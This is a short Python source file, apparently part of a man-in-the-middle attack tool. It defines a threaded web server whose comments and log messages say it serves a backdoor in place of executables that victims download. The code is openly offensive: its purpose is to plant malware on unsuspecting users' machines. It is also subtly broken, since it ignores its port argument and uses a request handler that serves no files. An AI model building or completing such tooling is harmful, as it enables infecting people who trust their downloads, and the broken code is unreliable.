# This class will be used to spawn a webserver to serve a backdoor
# When the client downloads an executable, it will be replaced by the backdoor.

import http.server as webserver
import socketserver
import logging
import socket
from threading import Thread, Event

class SimpleWebserver(Thread):
    def __init__(self, *args):
        super().__init__()
        self.port = args[0]
        self.logger = args[1]
        self.ip = self.getIP()
        self.print_name = "Webserver"
        self.httpd = webserver.HTTPServer(('',80), webserver.BaseHTTPRequestHandler)

    def getIP(self):
        return((([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")] or [[(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) + ["no IP found"])[0])

    def classPrint(self, text, icon):
        #Adds a class name to the printed messages.
        msg = "{} {}\t  -> \t{}".format(icon,self.print_name,text)
        self.logger.info(msg)

    def join(self, timeout=None):
        #for joining the thread / stopping the sniffing
        self.classPrint("Stopping webserver.", "[-]")
        self.httpd.shutdown()
        super().join(timeout)

    def run(self):
        self.classPrint("Serving backdoor at : {}:{}".format(self.ip, self.port),"[+]")
        self.httpd.serve_forever()
